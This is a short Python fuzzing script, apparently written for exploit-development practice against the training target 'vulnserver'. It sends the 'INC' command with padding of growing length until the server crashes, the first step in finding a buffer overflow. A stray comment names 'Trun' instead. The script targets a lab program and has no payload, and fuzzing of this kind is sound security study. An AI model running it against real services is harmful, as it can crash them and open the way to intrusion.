import sys
import socket


targetIP = sys.argv[1]
targetPort = int(sys.argv[2])

#First bit of the malicous string
#Trun is the remote command we're targeting

command = "INC "

try:
	for i in range(0,100):
		print("Trying string that has a length:" + str(i))
		overflow = "A" * i
		bstring = command + overflow + "\r\n"
		
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(5)
		s.connect((targetIP, targetPort))
		
		d = s.recv(1024).decode()
		s.send(bstring.encode())
		d = s.recv(1024).decode()

		s.close()
		
		
except: 
	print("The vulnserver has crashed")

